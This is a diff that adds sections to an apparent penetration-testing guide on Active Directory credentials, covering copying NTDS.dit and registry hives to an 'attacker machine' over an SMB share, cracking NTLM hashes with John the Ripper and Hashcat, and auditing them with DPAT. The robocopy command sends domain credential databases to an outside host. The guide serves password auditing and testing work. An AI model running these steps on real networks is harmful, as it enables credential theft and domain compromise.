@@ -284,6 +284,93 @@ ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 
 The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
 
+## Transferring Extracted Files
+
+Once you have extracted the NTDS.dit, SYSTEM, and (optionally) SECURITY files on the Domain Controller, you need to transfer them to your attacker machine for cracking and analysis. One common method is to host an SMB share on Kali and use Robocopy on the DC:
+
+```bash
+# On attacker (Kali)
+impacket-smbserver share . -smb2support
+
+# On the Domain Controller (with extracted files in C:\pentest)
+robocopy C:\pentest \\10.10.14.57\share\ /E
+```
+
+- `-smb2support` enables SMB2/3 on the Impacket share.
+- `/E` ensures all subdirectories and files are copied.
+
+## Cracking Password Hashes
+
+Windows stores two types of hashes: LM (legacy) and NTLM. Modern environments rely on NTLM-only or disable LM entirely. Use dedicated tools to recover plaintext passwords.
+
+### John the Ripper
+
+John the Ripper supports dictionary, brute-force, and hybrid attacks, and allows custom rules to expand base wordlists.
+
+1. Prepare a base wordlist (e.g., `/usr/share/wordlists/rockyou.txt`).
+2. Define rules in `john.conf` (e.g., `cAz"[0-9]"` to capitalize first letter and append a digit).
+3. Generate an expanded wordlist:
+
+    ```bash
+    john --wordlist=wordlist.txt --rules=One --stdout > new_wordlist.txt
+    ```
+4. Crack NTLM hashes:
+
+    ```bash
+    john --format=nt hashes.ntds --show
+    ```
+
+The `--show` option displays recovered plaintext alongside the hash entries.
+
+### Hashcat
+
+Hashcat is a powerful GPU-accelerated cracking tool with built-in and custom rule support.
+
+```bash
+# NTLM mode (-m 1000), dictionary (-a 0), apply built-in rule
+hashcat -m 1000 -a 0 ntlm_hashes.txt wordlist.txt -r rules/best64.rule
+```
+
+- `-m 1000`: NTLM hash mode.
+- `-a 0`: Dictionary attack.
+- `-r`: Rule file to apply.
+
+Cracked passwords are saved in the `hashcat.potfile` by default.
+
+## Analysis with DPAT
+
+DPAT (Domain Password Audit Tool) provides detailed password metrics and compliance reporting.
+
+1. Export privileged group members:
+
+    ```powershell
+    Get-ADGroupMember -Identity "Domain Admins" |
+      ForEach-Object { "$((Get-ADDomain).DNSRoot)\$($_.SamAccountName)" } |
+      Out-File DomainAdmins.txt
+    ```
+
+2. Re-extract their hashes (optional):
+
+    ```bash
+    secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL -outputfile customer
+    ```
+
+3. Run DPAT with the NTDS dump and potfile:
+
+    ```bash
+    python3 dpat.py -n customer.ntds -c hashcat.potfile -g "DomainAdmins.txt" "EnterpriseAdmins.txt"
+    ```
+
+DPAT generates metrics such as password length distribution, reuse statistics, history compliance, top passwords, and group comparisons.
+
+## References
+
+- Blog: How to conduct a Password Audit in Active Directory (AD) – https://www.pentestpartners.com/security-blog/how-to-conduct-a-password-audit-in-active-directory-ad/
+- Microsoft Docs: ntdsutil snapshot – https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ntdsutil
+- Impacket secretsdump – https://github.com/fortra/impacket/tree/master/examples/secretsdump.py
+- DPAT (Domain Password Audit Tool) – https://github.com/clr2of8/DPAT
+- gosecretsdump (large NTDS.dit extraction) – https://github.com/c-sto/gosecretsdump
+
 ## Lazagne
 
 Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
